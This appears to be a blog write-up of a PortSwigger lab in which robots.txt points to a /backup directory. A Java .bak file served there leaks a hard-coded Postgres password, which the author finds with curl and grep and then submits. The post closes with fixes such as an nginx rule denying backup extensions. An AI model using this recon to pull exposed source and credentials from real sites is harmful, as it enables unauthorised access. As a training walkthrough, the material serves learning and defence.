---
layout: post
title: "PortSwigger: Source Code Disclosure via Backup Files"
date: 2027-10-13 09:00:00 -0500
categories: [PortSwigger, WebSecurityAcademy, InformationDisclosure]
tags: [portswigger, information-disclosure, backup-files, robots-txt, source-disclosure, hardcoded-credentials, recon, cwe-530]
---

A web server is supposed to *run* your source code, not hand it back. But leave a backup copy of a file in the web root and the server serves it as plain text — source and all. This lab leaks a hard-coded database password out of a `.bak` file that was helpfully pointed to by `robots.txt`. It's a textbook example of [CWE-530](https://cwe.mitre.org/data/definitions/530.html) (Exposure of a Backup File to an Unauthorized Control Sphere).

## Overview

The shop is ordinary — a product catalogue. The goal is to find the database password and submit it. There's nothing sensitive linked in the UI, so the whole challenge is *finding* the file that shouldn't be reachable.

## robots.txt is a treasure map, not a lock

`robots.txt` tells search-engine crawlers which paths to skip. The catch: it's a public file, and a `Disallow:` line is a signpost pointing straight at whatever the admin wanted to keep out of search results.

```bash
curl -sk 'https://<lab-id>.web-security-academy.net/robots.txt'
```

```
User-agent: *
Disallow: /backup
```

There it is — an unlinked `/backup` directory.

## The backup file serves raw source

The live application is written in Java. Normally the server compiles and runs `.java`-backed classes, so you only ever see their output. But a leftover editor backup keeps the original filename with a `.bak` extension tacked on — and the server has no handler for `.bak`, so it returns the file as **plain text**:

```bash
curl -sk 'https://<lab-id>.web-security-academy.net/backup/ProductTemplate.java.bak' | grep -iE 'password|postgres'
```

```java
        ConnectionBuilder connectionBuilder = ConnectionBuilder.from(
                "org.postgresql.Driver",
                "postgresql",
                "localhost",
                5432,
                "postgres",
                "postgres",
                "v60ugu568o9ak1d3pg9ympbpdflayrt2"
        ).withAutoCommit();
```

The Postgres password is sitting right there in the connection builder.

## Submit and confirm

```bash
curl -sk -X POST 'https://<lab-id>.web-security-academy.net/submitSolution' \
  -d 'answer=v60ugu568o9ak1d3pg9ympbpdflayrt2'
```

```json
{"correct":true}
```

The lab status widget flips to **Solved**. No browser, no tooling beyond `curl`.

## Why it worked

Two ordinary mistakes chained together:

1. **`robots.txt` advertised the hiding place.** It's a discovery map, never access control.
2. **The backup file was served raw.** The server had no mapping for `.bak`, so instead of executing the code it returned the source — and the source had a credential baked in.

## The fix

- **Never store backups inside the web root.** Deploy from a clean build artifact so no stray `.bak` / `~` / `.old` / `.orig` / `.swp` files land where the server can serve them.
- **Deny backup extensions and fail closed** on any extension the server has no handler for:
  ```
  location ~* \.(bak|old|orig|save|swp)$|~$ { deny all; }
  ```
- **Don't list sensitive directories in `robots.txt`** — it only advertises them.
- **Keep credentials out of source.** Use environment variables or a secrets manager, never a literal password in a connection string.
